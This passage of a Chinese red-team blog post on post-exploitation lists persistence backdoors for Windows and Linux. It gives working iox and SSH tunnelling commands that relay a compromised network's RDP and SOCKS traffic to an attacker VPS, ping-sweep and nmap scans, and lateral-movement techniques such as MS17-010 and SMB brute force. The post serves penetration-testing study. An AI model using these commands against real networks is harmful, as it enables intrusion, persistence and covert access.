+    <a href="#3%e7%b3%bb%e7%bb%9f%e5%90%8e%e9%97%a8" class="header-mark"></a>3.0.6 3.系统后门</h4><h5 id="windows" class="headerLink">
+    <a href="#windows" class="header-mark"></a>3.0.6.1 Windows</h5><p>① 利用任务计划定时反弹会话
+② 利用开机启动项
+③ 影子账户以及guest账户
+④ 注册表
+⑤ 系统工具后门（shift后门）
+⑥ WMI后门
+⑦ DLL劫持
+⑧ 进程注入</p>
+<h5 id="linux" class="headerLink">
+    <a href="#linux" class="header-mark"></a>3.0.6.2 Linux</h5><p>① ssh、openssh后门
+② 任务计划
+③ VIM后门
+④ 添加超级用户
+⑤ SUID后门
+⑥ 利用自启动程序
+⑦ rootkit后门</p>
+<h4 id="4利用iis等服务制作后门" class="headerLink">
+    <a href="#4%e5%88%a9%e7%94%a8iis%e7%ad%89%e6%9c%8d%e5%8a%a1%e5%88%b6%e4%bd%9c%e5%90%8e%e9%97%a8" class="header-mark"></a>3.0.7 4.利用IIS等服务制作后门</h4><p>常用隧道建立工具</p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230714132507946.png" title="image-20230714132507946" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230714132507946.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230714132507946.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230714132507946.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230714132507946.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230714132507946.png 2x"
+            sizes="auto"
+            alt="image-20230714132507946">
+    </a></figure></p>
+<h5 id="41-探测是否出网" class="headerLink">
+    <a href="#41-%e6%8e%a2%e6%b5%8b%e6%98%af%e5%90%a6%e5%87%ba%e7%bd%91" class="header-mark"></a>3.0.7.1 4.1 探测是否出网</h5><ul>
+<li>ICMP：ping IP；</li>
+<li>TCP：nc -zv ip 端口；</li>
+<li>HTTP：curl www.xxx；</li>
+<li>DNS：nslookup [www.baidu.com]</li>
+</ul>
+<h5 id="42-网络层常用隧道" class="headerLink">
+    <a href="#42-%e7%bd%91%e7%bb%9c%e5%b1%82%e5%b8%b8%e7%94%a8%e9%9a%a7%e9%81%93" class="header-mark"></a>3.0.7.2 4.2 网络层常用隧道</h5><p><strong>IPv6隧道</strong></p>
+<p>kali自带，6tunnel是一个隧道工具，可以从ipv6到ipv4，也能从ipv4到ipv6。</p>
+<p>使用：</p>
+<p>首先开启目标机上的IPV6,ipconfig查看ipv6地址</p>
+<p>kali：6tunnel -4 80 targetipv6IP 80   #这条命令的含义就是将目标机的80端口（目标机使用IPV6地址）转发到本机的80端口上（本机使用IPV4地址）转发成功后，访问本机80端口便可以访问到目标机上正在运行的web服务；</p>
+<h5 id="43-传输层常用隧道" class="headerLink">
+    <a href="#43-%e4%bc%a0%e8%be%93%e5%b1%82%e5%b8%b8%e7%94%a8%e9%9a%a7%e9%81%93" class="header-mark"></a>3.0.7.3 4.3 传输层常用隧道</h5><p><strong>IOX</strong></p>
+<p>github：https://github.com/EddieIvan01/iox</p>
+<p>使用，比如我们将内网的3389端口转发到我们的attackhost：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">target:./iox fwd -r 192.168.0.100:3389 -r *1.1.1.1:8888 -k 656565   #-k启用加密
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">vps:./iox fwd -l *8888 -l 33890 -k 656565
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>socks代理</p>
+<p>修改<code>/etc/proxychains.conf</code></p>
+<p>在本地<code>0.0.0.0:1080</code>启动Socks5服务</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">./iox proxy -l 1080
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在被控机开启Socks5服务，将服务转发到公网attackhost</p>
+<p>在attackhost上转发<code>0.0.0.0:9999</code>到<code>0.0.0.0:1080</code></p>
+<p>你必须将两条命令成对使用，因为它内部包含了一个简单的协议来控制回连</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">./iox proxy -r 1.1.1.1:9999
+</span></span><span class="line"><span class="cl">./iox proxy -l 9999 -l 1080       // 注意，这两个端口是有顺序的
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>接着连接内网主机</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># proxychains.conf
+</span></span><span class="line"><span class="cl"># socks5://1.1.1.1:1080
+</span></span><span class="line"><span class="cl">​
+</span></span><span class="line"><span class="cl">$ proxychains rdesktop 192.168.0.100:3389
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h5 id="44-应用层常用隧道" class="headerLink">
+    <a href="#44-%e5%ba%94%e7%94%a8%e5%b1%82%e5%b8%b8%e7%94%a8%e9%9a%a7%e9%81%93" class="header-mark"></a>3.0.7.4 4.4 应用层常用隧道</h5><p><strong>SSH</strong></p>
+<p>ssh常用参数：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">-C 压缩传输
+</span></span><span class="line"><span class="cl">-f 后台执行SSH
+</span></span><span class="line"><span class="cl">-N 建立静默连接
+</span></span><span class="line"><span class="cl">-g 允许远程主机连接本地用于转发的端口
+</span></span><span class="line"><span class="cl">-L 本地端口转发
+</span></span><span class="line"><span class="cl">-R 远程端口转发
+</span></span><span class="line"><span class="cl">-D 动态转发
+</span></span><span class="line"><span class="cl">-P 指定SSH端口
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>本地端口转发</strong></p>
+<p>攻击机：192.168.1.1
+web服务器：192.168.1.2
+数据库服务器：192.168.1.3</p>
+<p>攻击机无法访问数据库服务器，但可以访问web服务器且已获得web服务器的权限，web服务器和数据库服务器可以互相访问的场景</p>
+<p>攻击机执行：<code>ssh -fCNg -L 2022:192.168.1.1:3389 root@192.168.1.2 -p 22</code></p>
+<p>攻击机去连接web服务器，连上之后由web服务器去连接数据库服务器的3389端口并把数据通过SSH通道传给攻击机，此时在攻击机访问本地2022端口即可打开数据库服务器的远程桌面</p>
+<p><strong>远程转发</strong></p>
+<p>攻击机无法访问数据库服务器，也无法访问web服务器但已获得web服务器的权限，web服务器和数据库服务器可以互相访问，web服务器可以访问具有公网IP的攻击机,通过访问攻击机本机的2022端口来访问数据库服务器的3389端口</p>
+<p>在web服务器上执行：<code>ssh -CfNg -R 2022:192.168.1.3:3389 root@192.168.1.1</code></p>
+<p>此时在攻击机访问本地2022端口即可打开数据库服务器的远程桌面</p>
+<p><strong>动态转发</strong></p>
+<p>① 攻击机执行：ssh -CfNg -D 2022 <a href="mailto:root@192.168.1.2" rel="">root@192.168.1.2</a>
+② 本地设置socks代理后即可访问数据库服务器</p>
+<h5 id="45-dnsiodine" class="headerLink">
+    <a href="#45-dnsiodine" class="header-mark"></a>3.0.7.5 4.5 DNS（iodine）</h5><p>要使用此隧道，您需要一个真实的域名（如mydomain.com），以及一个具有公共 IP 地址的服务器以在其上运行iodined；</p>
+<h2 id="横向移动" class="headerLink">
+    <a href="#%e6%a8%aa%e5%90%91%e7%a7%bb%e5%8a%a8" class="header-mark"></a>4 横向移动</h2><p>通常进入内网后，同样会进行内网信息收集、域内信息收集，在通过收集的信息进行内网漫游横向渗透扩大战果，在内网漫游过程中，会重点关注邮件服务器权限、OA系统权限、版本控制服务器权限、集中运维管理平台权限、统一认证系统权限、域控权限等位置，尝试突破核心系统权限、控制核心业务、获取核心数据，最终完成目标突破工作。</p>
+<h4 id="内网主机存活探测" class="headerLink">
+    <a href="#%e5%86%85%e7%bd%91%e4%b8%bb%e6%9c%ba%e5%ad%98%e6%b4%bb%e6%8e%a2%e6%b5%8b" class="header-mark"></a>4.0.8 内网主机存活探测</h4><h5 id="1icmp" class="headerLink">
+    <a href="#1icmp" class="header-mark"></a>4.0.8.1 1.ICMP</h5><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Windows：
+</span></span><span class="line"><span class="cl">for /l %i in (1,1,255) do @ping 192.168.1.%i -w 1 -n 1|find /i &#34;ttl=&#34;
+</span></span><span class="line"><span class="cl">​
+</span></span><span class="line"><span class="cl">C:\Users\test&gt;for /l %i in (1,1,255) do @ping 192.168.1.%i -w 1 -n 1|find /i &#34;ttl=&#34;
+</span></span><span class="line"><span class="cl">来自 192.168.1.1 的回复: 字节=32 时间=2ms TTL=254
+</span></span><span class="line"><span class="cl">来自 192.168.1.3 的回复: 字节=32 时间=127ms TTL=64
+</span></span><span class="line"><span class="cl">来自 192.168.1.5 的回复: 字节=32 时间=14ms TTL=64
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Linux：
+</span></span><span class="line"><span class="cl">for i in $( seq 1 255);do ping -c 2 192.168.1.$i|grep &#34;ttl&#34;|awk -F &#34;[ :]+&#34; &#39;{print $4}&#39;; done
+</span></span><span class="line"><span class="cl">​
+</span></span><span class="line"><span class="cl">root@localhost:~# for i in $( seq 1 255);do ping -c 2 192.168.1.$i|grep &#34;ttl&#34;|awk -F &#34;[ :]+&#34; &#39;{print $4}&#39;; done
+</span></span><span class="line"><span class="cl">192.168.1.1
+</span></span><span class="line"><span class="cl">192.168.1.3
+</span></span><span class="line"><span class="cl">192.168.1.5
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h5 id="2nmap" class="headerLink">
+    <a href="#2nmap" class="header-mark"></a>4.0.8.2 2.nmap</h5><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ARP 扫描：     nmap -PR -sn 192.168.1.0/24
+</span></span><span class="line"><span class="cl">ICMP 扫描：    nmap ‐sP ‐PI 192.168.1.0/24 ‐T4
+</span></span><span class="line"><span class="cl">SNMP 扫描：    nmap -sU --script snmp-brute 192.168.1.0/24 -T4
+</span></span><span class="line"><span class="cl">UDP 扫描：     nmap -sU -T5 -sV --max-retries 1 192.168.1.1 -p 500
+</span></span><span class="line"><span class="cl">NetBIOS 扫描：     nmap --script nbstat.nse -sU -p137 192.168.1.0/24 -T4
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="内网主机端口探测" class="headerLink">
+    <a href="#%e5%86%85%e7%bd%91%e4%b8%bb%e6%9c%ba%e7%ab%af%e5%8f%a3%e6%8e%a2%e6%b5%8b" class="header-mark"></a>4.0.9 内网主机端口探测</h4><h5 id="1单个端口探测" class="headerLink">
+    <a href="#1%e5%8d%95%e4%b8%aa%e7%ab%af%e5%8f%a3%e6%8e%a2%e6%b5%8b" class="header-mark"></a>4.0.9.1 1.单个端口探测</h5><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">telnet
+</span></span><span class="line"><span class="cl">E:\ipscan&gt;telnet 10.10.25.176 80
+</span></span><span class="line"><span class="cl">正在连接10.10.25.176...无法打开到主机的连接。 在端口 80: 连接失败
+</span></span><span class="line"><span class="cl">​
+</span></span><span class="line"><span class="cl">NC
+</span></span><span class="line"><span class="cl">root@localhost:~# nc -vv 10.10.12.162 22
+</span></span><span class="line"><span class="cl">Connection to 10.10.12.162 22 port [tcp/ssh] succeeded!
+</span></span><span class="line"><span class="cl">SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h5 id="2多个端口探测" class="headerLink">
+    <a href="#2%e5%a4%9a%e4%b8%aa%e7%ab%af%e5%8f%a3%e6%8e%a2%e6%b5%8b" class="header-mark"></a>4.0.9.2 2.多个端口探测</h5><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">fscan    https://github.com/shadow1ng/fscan
+</span></span><span class="line"><span class="cl">fscan.exe -h 192.168.1.1/24 -p 1-65535
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>通过代理后使用nmap、msf进行扫描</p>
+<h3 id="横向移动方法" class="headerLink">
+    <a href="#%e6%a8%aa%e5%90%91%e7%a7%bb%e5%8a%a8%e6%96%b9%e6%b3%95" class="header-mark"></a>4.1 横向移动方法：</h3><ul>
+<li>利用ms17010等系统漏洞</li>
+<li>对跳板机密码进行抓取，使用抓取到密码爆破内网其他主机</li>
+<li>利用EDR、堡垒机、云管平台、vmware esxi等集权系统漏洞</li>
+<li>使用内网邮件服务进行邮件钓鱼</li>
+<li>利用IPC$横向移动</li>
+<li>smb爆破</li>
+<li>对管理端口、数据库进行弱口令爆破</li>
+<li>未授权访问漏洞</li>
+<li>域渗透相关漏洞</li>
+<li>虚拟机逃逸</li>
+</ul>
+</div>
+
+        
+
+
+<h2>Related Content</h2>
+<div class="related-container">
+    <div class="related-item-container">
+            <h2 class="related-title">
+                <a href="/buuctf_reinforce_wp/">BUUCTF awdp加固题</a>
+            </h2>
+        </div>
+    <div class="related-item-container">
+            <h2 class="related-title">
+                <a href="/ctfhub--info_leakage/">ctfhub_信息泄露wp</a>
+            </h2>
+        </div>
+    <div class="related-item-container">
+            <h2 class="related-title">
+                <a href="/ctfshow_deserialize/">ctfshow_deserialize</a>
+            </h2>
+        </div>
+    <div class="related-item-container">
+            <h2 class="related-title">
+                <a href="/ctfshow_file_include/">ctfshow_file_include</a>
+            </h2>
+        </div>
+    <div class="related-item-container">
+            <h2 class="related-title">
+                <a href="/ctfshow_file_upload/">ctfshow_file_upload</a>
+            </h2>
+        </div>
+    
+
+</div>
+
+<div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 0001-01-01</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span><a class="link-to-mardown" href=/hvv_post_penetration/index.md target="_blank" rel="noopener noreferrer">Read markdown</a>
+                    </span><span>|&nbsp;<a class="link-to-source" href=https://github.com/HEIGE-PCloud/DoIt/blob/main/exampleSite/content/posts\hvv_post_penetration.md target="_blank" rel="noopener noreferrer">View source</a>
+                    </span><span>|&nbsp;<a class="link-to-edit" href=https://github.com/HEIGE-PCloud/DoIt/edit/main/exampleSite/content/posts\hvv_post_penetration.md target="_blank" rel="noopener noreferrer">Edit this page</a>
+                    </span><span>|&nbsp;<a class="link-to-report" href=https://github.com/HEIGE-PCloud/DoIt/issues/new?title=[bug]%20hvv_%E5%90%8E%E6%B8%97%E9%80%8F&body=|Field|Value|%0A|-|-|%0A|Title|hvv_%E5%90%8E%E6%B8%97%E9%80%8F|%0A|Url|http://scofield1920.github.io/hvv_post_penetration/|%0A|Filename|https://github.com/HEIGE-PCloud/DoIt/blob/main/exampleSite/content/posts\hvv_post_penetration.md| target="_blank" rel="noopener noreferrer">Report issue</a>
+                    </span></div>
+            <div class="post-info-share"><button title="Share on Twitter" data-sharer="twitter" data-url="http://scofield1920.github.io/hvv_post_penetration/" data-title="hvv_后渗透" data-hashtags="penetration,web,hvv"><span class="fab fa-twitter fa-fw"></span></button><button title="Share on Facebook" data-sharer="facebook" data-url="http://scofield1920.github.io/hvv_post_penetration/" data-hashtag="penetration"><span class="fab fa-facebook-square fa-fw"></span></button><button title="Share on Hacker News" data-sharer="hackernews" data-url="http://scofield1920.github.io/hvv_post_penetration/" data-title="hvv_后渗透"><span class="fab fa-hacker-news fa-fw"></span></button><button title="Share on Line" data-sharer="line" data-url="http://scofield1920.github.io/hvv_post_penetration/" data-title="hvv_后渗透"><span data-svg-src="/lib/simple-icons/icons/line.min.svg"></span></button><button title="Share on 微博" data-sharer="weibo" data-url="http://scofield1920.github.io/hvv_post_penetration/" data-title="hvv_后渗透"><span class="fab fa-weibo fa-fw"></span></button><button title="Share on Telegram" data-sharer="telegram" data-url="http://scofield1920.github.io/hvv_post_penetration/" data-title="hvv_后渗透" data-web><span class="fab fa-telegram-plane fa-fw"></span></button><script>
+        function shareOnMastodon(title, link) {
+            const SHARE_MASTODON_DOMAIN = "share_mastodon_domain"
+            const savedDomain = localStorage.getItem(SHARE_MASTODON_DOMAIN) ?? "mastodon.social";
+            const domain = prompt("Enter your Mastodon domain", savedDomain);
+            if (domain === null) {
+                return;
+            }
+            localStorage.setItem(SHARE_MASTODON_DOMAIN, domain)
+            const text = title + "\n\n" + link;
+            const url = new URL("https://" + domain)
+            url.pathname = "share"
+            url.searchParams.append('text', text)
+            window.open(url, '_blank', "width=500,height=500,left=500,toolbar=0,status=0");
+        }
+    </script>
+    <button title="Share on Mastodon"onclick="javascript:shareOnMastodon(&#34;hvv_后渗透&#34;, &#34;http://scofield1920.github.io/hvv_post_penetration/&#34;)"><span class="fab fa-mastodon fa-fw"></span></button></div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/penetration/">penetration</a>,&nbsp;<a href="/tags/web/">web</a>,&nbsp;<a href="/tags/hvv/">hvv</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/hvv_emergency_response/" class="prev" rel="prev" title="hvv_应急响应"><i class="fas fa-angle-left fa-fw"></i>hvv_应急响应</a>
+            <a href="/hvv_middleware_bug/" class="next" rel="next" title="hvv_中间件漏洞">hvv_中间件漏洞<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div id="utterances"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">Utterances</a>.
+            </noscript></div></article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">
+                    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreferrer" title="Hugo 0.120.4">Hugo</a>&nbsp;|&nbsp;Theme - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreferrer" title="DoIt 0.4.0"><i class="far fa-edit fa-fw"></i> DoIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank" rel="noopener noreferrer"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="Back to Top">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":10},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"","lightTheme":"github-light","repo":"Hugo-DoIt/utterances-comments"}},"data":{"desktop-header-typeit":"Scfie1d-Blog","mobile-header-typeit":"Scfie1d-Blog"},"search":{"algoliaAppID":"5YGRNRQK1G","algoliaIndex":"en_index","algoliaSearchKey":"0ff6874805de24b84aa1d5ebccad56cd","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":300,"type":"algolia"},"sharerjs":true,"table":{"sort":true},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"desktop-header-typeit":["desktop-header-typeit"],"mobile-header-typeit":["mobile-header-typeit"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/typeit.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script><script type="text/javascript" src="/js/utterances.min.js" defer></script></div>
+</body>
+
+</html>
